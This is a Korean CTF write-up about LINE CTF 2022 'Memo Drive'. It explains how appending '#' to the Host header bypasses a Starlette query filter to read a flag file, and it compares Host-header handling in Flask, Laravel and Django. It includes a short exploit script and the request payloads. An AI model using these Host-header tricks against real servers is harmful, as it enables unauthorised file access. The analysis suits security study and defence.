@@ -1,0 +1,566 @@
+---
+title: Host header injection - Case study
+h1: Host header injection - Case study
+summary: Host 헤더와 HTTP 요청 메세지 파싱 방식에 관하여
+date: '2021-03-10'
+lastmod: '2021-03-10'
+draft: false
+---
+
+최근에 LINECTF 2022에 참가했는데, 그 중에 Memo Drive 문제에 내 답이 언인텐이었다. 그래서 대회가 끝나고 왜 이런 일이 일어난 건지 좀 더 조사해보기로 했다.
+
+## Challenge explanation
+
+아래는 LINECTF 2022 Memo Drive의 문제 중 일부다.
+
+**index.py:**
+
+```python
+from starlette.applications import Starlette
+from starlette.responses import JSONResponse
+from starlette.routing import Route
+...
+def view(request):
+    context = {}
+
+    try:
+        context['request'] = request
+        clientId = getClientID(request.client.host)
+
+        if '&' in request.url.query or '.' in request.url.query or '.' in unquote(request.query_params[clientId]):
+            raise
+
+        filename = request.query_params[clientId]
+        path = './memo/' + "".join(request.query_params.keys()) + '/' + filename
+
+        f = open(path, 'r')
+        contents = f.readlines()
+        f.close()
+
+        context['filename'] = filename
+        context['contents'] = contents
+
+    except:
+        pass
+
+    return templates.TemplateResponse('/view/view.html', context)
+
+```
+
+**Starlette** 프레임워크를 사용하고 있고, 코드를 보면 url의 query 부분에 필터링을 통해 임의의 파일을 읽는 것을 막고 있다.
+
+**exploit.py:**
+
+```python
+from requests import *
+
+url = "http://localhost:3000"
+def ex():
+    p = "/view?clientId=flag&/.."
+    h = {
+        'Host': 'localhost:3000#'
+    }
+    r = get(url+p, headers=h)
+    print (r.text)
+
+if __name__ == "__main__":
+    ex()
+```
+
+`Host`헤더의 값 끝에 `#`을 붙였다. 그러면 `request.url`은 `http://localhost:3000#/view?clientId=flag&/..`가 되고, `request.url.query`는 빈 문자열이 되어 필터링을 우회할 수 있다.
+
+## How server get full url from request?
+
+문제에서와 같은 일이 왜 발생하는 걸까? 클라이언트와 서버는 HTTP 요청/응답을 이용해 통신한다. Express, Flask, Django, .. 등 백엔드 프레임워크를 사용하다보면 라우터 미들웨어에서 HTTP 요청과 응답에 접근해서 무언가 하는 경우가 많다. 예를 들면 응답에 헤더를 추가해서 보낸다거나, 요청의 헤더를 가져와서 검사를 한다거나 등등.. 그 중 하나가 요청의 URL을 사용하는 일이다. HTTP 요청 예시 하나를 보자.
+
+```
+> GET / HTTP/1.1
+> Host: google.com
+> User-Agent: curl/7.68.0
+> Accept: */*
+```
+
+요청의 URL을 명시하고 있는 헤더는 어디에도 없다. 그렇다면 어떻게 많은 프레임워크에서 요청의 URL을 사용할 수 있도록 하는 걸까?
+
+사실 위 요청에서 URL을 명시하진 않았지만, `Host` 헤더와 Request-URI(`path`, `query string`)를 통해 위 요청이 `http(s)://google.com/` 으로 보내는 요청임을 알 수 있다. 서버에서 URL을 파악하는 방법도 별반 다르지 않다. 예시로 문제에서 나왔던 **Starlette** 프레임워크의 경우를 보자.
+
+**[starlette/starlette/datastructures.py#L7](https://github.com/encode/starlette/blob/eeb0457aed1cfc2d33cd85157825f2d2de4a2026/starlette/datastructures.py#L37)**:
+
+```python
+            if host_header is not None:
+                url = f"{scheme}://{host_header}{path}"
+```
+
+이처럼 전체 url을 만들기 위해서는 `Host` 헤더의 값을 참고해서 만들어야 한다. 반면, path와 query string은 HTTP 요청의 첫번 째 줄 파싱하는 과정에서 알 수 있다. 그래서 어떤 프레임워크에서는 요청의 path와 query string을 사용할 수 있는 메소드나 프로퍼티를 제공하지만, 전체 url은 지원하지 않는 경우도 있다.
+
+다른 프레임워크에서는 어떻게 다루고 있을지 궁금해서 [The Top 5 Most Popular Backend Frameworks for 2022](https://enlear.academy/the-top-5-most-popular-backend-frameworks-for-2022-9fbb8d07cca5)를 참고해서 Ruby on Rails와 Express를 제외한 3개의 백엔드 프레임워크에 대해 케이스 스터디를 진행해봤다.
+
+---
+
+케이스 스터디는 **서버 코드, 요청 보내는 코드, 결과** 그리고 추가 분석으로 이루어져 있다.
+
+## 1. Flask - Python
+
+Flask는 마이크로 웹 프레임워크 중 하나로 api 서버, 테스트 서버 등의 목적으로 많이 사용된다. Flask에서도 마찬가지로 `request.url`을 사용할 수 있다. 서버를 만들어서 테스트해보자.
+
+**flask_app.py:**
+
+```python
+from flask import Flask, request
+app = Flask(__name__)
+
+@app.route('/<username>')
+def index(username):
+    print(f"request.url: {request.url}")
+    print(f"\npath variable: {username}")
+    print(f"\nrequest.query_string: {request.query_string}") # RFC 2396
+    return "hello world"
+
+if __name__ == "__main__":
+    app.run('127.0.0.1', 3000)
+```
+
+**req.py:**
+
+```python
+from requests import *
+
+url = "http://localhost:3000"
+def req():
+    p = "/bbangjo?key1=val1"
+    h = {
+        'Host': 'localhost:3000#'
+    }
+    r = get(url+p, headers=h)
+
+if __name__ == "__main__":
+    req()
+```
+
+**result:**
+
+```
+request.url: http://localhost:3000#/bbangjo?key1=value1&key2=value2
+
+path variable: bbangjo
+
+request.query_string: b'key1=value1&key2=value2'
+```
+
+역시 `request.url`를 만들 때 `Host` 헤더의 값이 그대로 사용하고 있다. path와 query string은 HTTP 요청의 첫번째 줄에서 사용한 그대로 나오고 있다. 이를 통해 `request.query_string`을 만드는 과정은 `Host` 헤더 값과는 별개로, HTTP 요청을 파싱하는 과정에서 이루어짐을 알 수 있다. 이와 같은 상황에서 URL이 잘못 사용될 수 있는 예로, `urlparse`을 사용할 때가 있다.
+
+`request.url`을 파싱하게 되면 `#` 때문에 `#` 이후 부분은 모두 fragment로 인식되지만, 라우팅을 할 때는 HTTP 요청 첫 번째 줄의 메소드와 path 정보를 사용하기 때문에 요청은 해당 라우터에 정상적으로 전달된다.
+
+**flask_app.py**
+
+```python
+from flask import Flask, request, jsonify
+from urllib.parse import urlparse
+import json
+app = Flask(__name__)
+
+@app.route('/<username>')
+def index(username):
+    o = urlparse(request.url)
+    print(f"urlparse path: {o.path}")
+    print(f"path variable: {username}")
+
+    print(f"\nurlparse query: {o.query}")
+    print(f"request.query_string: {request.query_string}")
+    return 'hello'
+
+if __name__ == "__main__":
+    app.run('127.0.0.1', 3000)
+```
+
+요청 코드는 위와 같고 결과를 보자.
+
+```
+urlparse path:
+path variable: bbangjo
+
+urlparse query:
+request.query_string: b'key1=value1&key2=value2'
+
+urlparse fragement: /bbangjo?key1=value1&key2=value2
+```
+
+예상한대로 `urlparse`의 결과에서는 path와 query가 비어있고, fragment에 모든 값이 들어있다. 잠재적으로 위험하다고 한 이유가 이 점 때문이다. 많은 개발자들이 `urlparse`를 사용해서 url을 다루는데, 이 경우에 사용하는 값들 간의 불일치가 발생하여 로직에 문제가 생길 수 있다.
+
+## 2. Laravel -PHP
+
+**web.php**
+
+```php
+Route::get('/', function (Request $request) {
+    $url = $request->url();
+    $fullUrl = $request->fullUrl();
+    $path = $request->path();
+    $query = $request->query();
+    echo "url: ".$url;
+    echo "\nfullUrl: ".$fullUrl;
+    echo "\npath: ".$path."\n";
+    var_dump($query);
+    return view('welcome');
+});
+```
+
+**Laravel**은 처음 써봐서 docs 따라 example-app 만들고 마찬가지로 `request` 인스턴스로부터 원하는 값들을 출력해봤다.
+
+**req.py**
+
+```python
+from requests import *
+
+url = "http://localhost:80"
+
+def ex():
+    p = "?key1=value1&key2=value2"
+    h = {
+        'Host': 'localhost:80#'
+    }
+    r = get(url+p, headers=h)
+    if r.status_code == 404:
+        print("404")
+    else:
+        print(r.text.split('<!DOCTYPE')[0])
+
+if __name__ == "__main__":
+    ex()
+```
+
+```
+$ python3 req.py
+404
+```
+
+흠? 이번엔 `Host` 헤더에 `#`을 추가하니까 404 not found가 뜬다.
+
+다른 값도 테스트 해보자.
+
+### Tests
+
+1. port만 다르게: **Host: localhost:3000** -> 200 OK
+
+```
+url: http://localhost:3000
+fullUrl: http://localhost:3000/?key1=value1&key2=value2
+path: /
+array(2) {
+  ["key1"]=>
+  string(6) "value1"
+  ["key2"]=>
+  string(6) "value2"
+}
+```
+
+2. hostname을 다르게: **Host: fakehost:3000** -> 200 OK
+
+```
+url: http://fakehost:3000
+fullUrl: http://fakehost:3000/?key1=value1&key2=value2
+path: /
+array(2) {
+  ["key1"]=>
+  string(6) "value1"
+  ["key2"]=>
+  string(6) "value2"
+}
+```
+
+3. null 문자 추가: **Host: fakehost:3000\x00#** -> 200 OK
+
+```
+url: http://fakehost:3000
+fullUrl: http://fakehost:3000/?key1=value1&key2=value2
+path: /
+array(2) {
+  ["key1"]=>
+  string(6) "value1"
+  ["key2"]=>
+  string(6) "value2"
+}
+```
+
+이번에도 마찬가지로 `Host` 헤더로부터 url 값을 가져옴을 확인할 수 있었지만, 어떤 이유에서인지 특정 문자들이 Host에 들어가면 404 not found가 뜬다. 그래서 아스키 범위에서 모두 테스트해보니까 신기한 결과가 나왔다.
+
+4. port 부분 뒤에 특정 아스키 문자: **Host: fakehost:3000a** -> 200 OK
+
+```
+url: http://fakehost:3000a:3000
+fullUrl: http://fakehost:3000a:3000/?key1=value1&key2=value2
+path: /
+array(2) {
+  ["key1"]=>
+  string(6) "value1"
+  ["key2"]=>
+  string(6) "value2"
+}
+```
+
+이를 통해 `url`, `fullUrl`을 만들 때 입력한 `Host` 헤더 값을 그대로 사용하지 않음을 알 수 있다. **Laravel**소스코드를 한번 들여다 보자.
+
+**[framework/src/illuminate/Http/Request.php#L105](https://github.com/laravel/framework/blob/9.x/src/Illuminate/Http/Request.php#L105)**:
+
+```php
+    public function url()
+    {
+        return rtrim(preg_replace('/\?.*/', '', $this->getUri()), '/');
+    }
+
+```
+
+**Laravel**의 Request 클래스의 부모 클래스에 `getUri`가 정의되어 있다.
+
+**[symfony/component/http-foundation/Request.php](https://github.com/symfony/http-foundation/blob/34e89bc147633c0f9dd6caaaf56da3b806a21465/Request.php):**
+
+```php
+    public function getHttpHost()
+    {
+        $scheme = $this->getScheme();
+        $port = $this->getPort();
+
+        if (('http' == $scheme && 80 == $port) || ('https' == $scheme && 443 == $port)) {
+            return $this->getHost();
+        }
+
+        return $this->getHost().':'.$port;
+    }
+...
+...
+    public function getSchemeAndHttpHost()
+    {
+        return $this->getScheme().'://'.$this->getHttpHost();
+    }
+...
+...
+    public function getUri()
+    {
+        if (null !== $qs = $this->getQueryString()) {
+            $qs = '?'.$qs;
+        }
+
+        return $this->getSchemeAndHttpHost().$this->getBaseUrl().$this->getPathInfo().$qs;
+    }
+...
+...
+    public function getHost()
+    {
+        if ($this->isFromTrustedProxy() && $host = $this->getTrustedValues(self::HEADER_X_FORWARDED_HOST)) {
+            $host = $host[0];
+        } elseif (!$host = $this->headers->get('HOST')) {
+            if (!$host = $this->server->get('SERVER_NAME')) {
+                $host = $this->server->get('SERVER_ADDR', '');
+            }
+        }
+
+        // trim and remove port number from host
+        // host is lowercase as per RFC 952/2181
+        $host = strtolower(preg_replace('/:\d+$/', '', trim($host)));
+
+        // as the host can come from the user (HTTP_HOST and depending on the configuration, SERVER_NAME too can come from the user)
+        // check that it does not contain forbidden characters (see RFC 952 and RFC 2181)
+        // use preg_replace() instead of preg_match() to prevent DoS attacks with long host names
+        if ($host && '' !== preg_replace('/(?:^\[)?[a-zA-Z0-9-:\]_]+\.?/', '', $host)) {
+            if (!$this->isHostValid) {
+                return '';
+            }
+            $this->isHostValid = false;
+
+            throw new SuspiciousOperationException(sprintf('Invalid Host "%s".', $host));
+        }
+
+        if (\count(self::$trustedHostPatterns) > 0) {
+            // to avoid host header injection attacks, you should provide a list of trusted host patterns
+
+            if (\in_array($host, self::$trustedHosts)) {
+                return $host;
+            }
+
+            foreach (self::$trustedHostPatterns as $pattern) {
+                if (preg_match($pattern, $host)) {
+                    self::$trustedHosts[] = $host;
+
+                    return $host;
+                }
+            }
+
+            if (!$this->isHostValid) {
+                return '';
+            }
+            $this->isHostValid = false;
+
+            throw new SuspiciousOperationException(sprintf('Untrusted Host "%s".', $host));
+        }
+
+        return $host;
+    }
+```
+
+`getHost` 함수를 먼저 보자. 일단 프록시 세팅이 켜져 있는지 확인하고 Host 값을 어떻게 가져올지 확인한 후, RFC 명세에 따라 FQDN을 가져온 후 lowercase를 취한다. 그리고 `preg_match`를 통해 Host 헤더의 값을 필터링한 후, 괜찮으면 리턴한다. 코드 상에서도 **host header injection attacks**에 대비하여 `$trustedHostPatterns`를 사용하기를 권고하고 있다.
+
+그리고 `getHttpHost`를 보면 `getHost`를 통해 가져온 값에, `port`를 따로 더해주고 있다. `getHost`를 할 때 port를 떼 내는 부분에서, `:\d+$` 즉, `:number` 로 끝나는 부분만 정규식으로 검사하기 때문에 number 뒤에 문자를 더해주면 replace 되지 않는다. 그래서 Host에도 그대로 남아있고, `getPort()` 에서 파싱하는 과정에서도 port가 또 들어가게 되서 **Tests 4번** 같은 경우가 생긴다.
+
+알 수 있는 점은, **Laravel**에서는 **Flask**, **Starlette**과 달리 `$request->url()`을 사용할 때, Host 헤더의 값을 그대로 사용하지 않고 RFC 명세에 따라 필터링해준다는 것이다. 이는 위에서 확인한 잠재적인 위협을 방지하기 위해서 적절한 조치라고 생각한다.
+
+### 404?
+
+근데, `Host`에 이상한 값이 들어갔을 때 서버 측 코드를 모두 주석처리해도 404 not found가 뜨고 Exception이 발생하지 않는다는 건 아예 라우팅이 제대로 되지 않았다는 건데,, 이유를 아직 잘 모르겠다.
+
+## 3. Django - Python
+
+Django는 파이썬 웹 프레임워크로, MVC 패턴을 따른다. 가이드따라 앱을 하나 만들고 테스트를 진행했다.
+
+**polls/urls.py:**
+
+```python
+from django.urls import path
+
+from . import views
+
+urlpatterns = [
+    path('', views.index, name='index'),
+]
+```
+
+**polls/views.py:**
+
+```python
+from django.http import HttpResponse
+
+def index(request):
+    print(f"request.path: {request.path}")
+    print(f"\nbuild_absolute_uri: {request.build_absolute_uri()}")
+    print(f"\nquery_string: {request.META['QUERY_STRING']}")
+    return HttpResponse("Hello, world. You're at the polls index.")
+```
+
+**req.py:**
+
+```python
+from requests import *
+
+url = "http://localhost:8000"
+
+def ex():
+    p = "/polls?key1=value1&key2=value2"
+    h = {
+        'Host': 'localhost:8000#'
+    }
+    r = get(url+p, headers=h)
+
+if __name__ == "__main__":
+    ex()
+```
+
+**result:**
+
+```
+[30/Mar/2022 08:33:33] "GET /polls?key1=value1&key2=value2 HTTP/1.1" 400 62501
+Invalid HTTP_HOST header: 'localhost:8000#'. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /polls
+```
+
+오,, 이번엔 400 bad request가 뜬다. 이 말은 아까 본 것처럼 어떤 식으로든 RFC 명세에 따라 Host에 부적절한 문자가 들었음을 확인하는 로직이 있다는 뜻이다. 여기서는 RFC 1034/1035을 참고했다고 한다.
+
+**[django/http/request.py](https://github.com/django/django/blob/main/django/http/request.py):**
+
+```python
+host_validation_re = _lazy_re_compile(
+    r"^([a-z0-9.-]+|\[[a-f0-9]*:[a-f0-9\.:]+\])(:[0-9]+)?$"
+)
+    def get_host(self):
+        """Return the HTTP host using the environment or request headers."""
+        host = self._get_raw_host()
+
+        # Allow variants of localhost if ALLOWED_HOSTS is empty and DEBUG=True.
+        allowed_hosts = settings.ALLOWED_HOSTS
+        if settings.DEBUG and not allowed_hosts:
+            allowed_hosts = [".localhost", "127.0.0.1", "[::1]"]
+
+        domain, port = split_domain_port(host)
+        if domain and validate_host(domain, allowed_hosts):
+            return host
+        else:
+            msg = "Invalid HTTP_HOST header: %r." % host
+            if domain:
+                msg += " You may need to add %r to ALLOWED_HOSTS." % domain
+            else:
+                msg += (
+                    " The domain name provided is not valid according to RFC 1034/1035."
+                )
+            raise DisallowedHost(msg)
+    ...
+
+    def _current_scheme_host(self):
+        return "{}://{}".format(self.scheme, self.get_host())
+    ...
+
+	def build_absolute_uri(self, location=None):
+		...
+        if location is None:
+            location = "//%s" % self.get_full_path()
+        else:
+            ...
+        bits = urlsplit(location)
+        if not (bits.scheme and bits.netloc):
+            ...
+            if (
+                bits.path.startswith("/")
+                and not bits.scheme
+                and not bits.netloc
+                and "/./" not in bits.path
+                and "/../" not in bits.path
+            ):
+                if location.startswith("//"):
+                    location = location[2:]
+                location = self._current_scheme_host + location
+            else:
+                ...
+        return iri_to_uri(location)
+
+def validate_host(host, allowed_hosts):
+    ...
+    return any(
+        pattern == "*" or is_same_domain(host, pattern) for pattern in allowed_hosts
+    )
+def split_domain_port(host):
+	...
+    host = host.lower()
+
+    if not host_validation_re.match(host):
+        return "", ""
+	...
+
+    bits = host.rsplit(":", 1)
+    domain, port = bits if len(bits) == 2 else (bits[0], "")
+    domain = domain[:-1] if domain.endswith(".") else domain
+    return domain, port
+```
+
+`build_absolute_uri`에서 `_current_scheme_host`를 사용하고, 그 안에서는 `get_host`를 호출한다. `get_host`에서는 `split_domain_port`로부터 domain, port를 분리하고 `validate_host`에서 valid 하지 않고, domain이 빈 문자열이면 **result**에서 봤던 에러메세지를 출력함을 알 수 있다.
+
+`split_domain_port`에서 Host헤더의 값이 host_validation_re와 매치되는지 확인하는데, 이 정규식 때문에 `[a-z0-9.-]`만 사용할 수 있다.
+
+또한, `validate_host`에서도 마찬가지로 Host 헤더의 값이 allow된 값인지 확인한다. 따라서 **Host: fakehost:3000**로 요청을 보내면 다음과 같은 에러가 뜬다.
+
+```
+Invalid HTTP_HOST header: 'fakehost:3000'. You may need to add 'fakehost' to ALLOWED_HOSTS.
+Bad Request: /polls
+```
+
+**Django**에서도 **Laravel**와 비슷하게 마찬가지로 RFC 명세에 따라 Host 헤더에 사용할 수 있는 문자를 제한하고, `ALLOWED_HOSTS` 목록에 속한 값만 사용할 수 있게끔 제한하고 있다.
+
+## Summary
+
+**Flask, Starlette:** Host 헤더에 필터링 아예 없음.
+
+**Laravel:** RFC 명세에 따라 Host 헤더에서 사용할 수 있는 문자 제한이 있음.
+
+**Django:** RFC 명세에 따라 Host 헤더에 사용할 수 있는 문자 제한이 있음. 거기에 `ALLOWED_HOSTS` 목록에 있는 host만 사용할 수 있게끔 제한하고 있음.
+
+## Conclusion && Expected security issue
+
+서버측에서 요청된 URL을 파악하기 위해서는 `Host` 헤더와 요청의 첫 번째 라인에서 path, query string 등의 정보를 사용한다. 대부분의 웹 프레임워크에서 HTTP 요청을 파싱한 후, 첫 번째 라인의 메소드와 path를 사용해 라우팅한다. 하지만 Host 헤더의 값이 제대로 필터링되지 않은 경우, 요청의 URL을 조작할 수 있게 되고, 서버측의 url parsing을 공격할 수 있다.
+
+**Laravel**과 **Django**의 경우 **Host header injection** 공격에 대비해 RFC 명세에 따른 문자 제한을 두고 ALLOWED_HOSTS 목록을 사용하는 것을 권고하고 있다. 반면 **Flask**와 CTF 문제에서의 **Starlette**의 경우는 어떠한 필터링도 하지 않고 있다. **Flask**는 파이썬 웹 프레임워크 중 **Django**와 더불어 가장 인기 있는 웹 프레임워크로 여겨지고 있다. 게다가 개발자 입장에서 이런 위협이 존재할 수 있다고 생각하기는 어렵다. **Flask**도 **Laravel**과 **Django** 마찬가지로 Host의 값을 검증하는 로직을 추가해야 한다고 생각한다.
